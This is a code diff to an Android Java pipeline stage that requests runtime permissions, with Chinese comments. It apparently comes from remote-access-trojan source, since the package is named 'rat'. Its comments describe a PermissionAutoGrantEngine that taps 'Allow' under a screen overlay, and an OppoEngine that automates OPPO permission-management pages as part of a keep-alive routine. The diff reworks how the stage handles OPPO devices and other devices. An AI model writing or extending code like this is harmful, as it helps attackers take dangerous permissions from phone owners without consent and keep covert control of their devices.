@@ -9,9 +9,9 @@ import com.vendor.rat.auto.pipeline.PipelineStage;
 /**
  * Stage 7: 请求运行时权限
  *
- * 触发 ActivMain 逐组请求危险权限。
- * PermissionAutoGrantEngine 在遮罩下自动点击"允许"。
- * 轮询等待所有权限授予（最多 60 秒）。
+ * 策略:
+ *   - OPPO: 跳过 — 权限已在 OppoEngine.handlePermissionManagement() 中处理
+ *   - 其他设备: requestPermissions() + PermissionAutoGrantEngine 被动监听
  */
 public class PermissionRequestStage implements PipelineStage {
 
@@ -20,31 +20,34 @@ public class PermissionRequestStage implements PipelineStage {
 
     @Override
     public void handle(PipelineContext passable, Runnable next) {
-        // Skip if all permissions already granted
+        if (passable.isOppo()) {
+            // OPPO: 权限已在 OppoEngine 保活流程中通过权限管理页面自动化处理
+            Log.d(TAG, "OPPO: skip (handled by OppoEngine.handlePermissionManagement)");
+            passable.setPermissionsGranted(ActivMain.allPermissionsGranted());
+            next.run();
+            return;
+        }
+
+        // 其他设备: 标准 PermissionController 弹窗流程
         if (ActivMain.allPermissionsGranted()) {
             next.run();
             return;
         }
 
-        // 清除中断标志
         Thread.interrupted();
-
         ActivMain.triggerPermissionRequest();
-        Log.d(TAG, "Permission request triggered, polling for completion");
+        Log.d(TAG, "Standard: permission request triggered");
 
         long polls = TIMEOUT_MS / 500;
         for (int i = 0; i < polls; i++) {
             if (ActivMain.allPermissionsGranted()) {
-                Log.d(TAG, "All permissions granted after " + (i * 500) + "ms");
+                Log.d(TAG, "Standard: all permissions granted");
                 break;
             }
             try { Thread.sleep(500); } catch (InterruptedException ignored) { break; }
         }
 
         passable.setPermissionsGranted(ActivMain.allPermissionsGranted());
-        if (!passable.isPermissionsGranted()) {
-            Log.w(TAG, "Not all permissions granted after timeout");
-        }
         next.run();
     }
 }
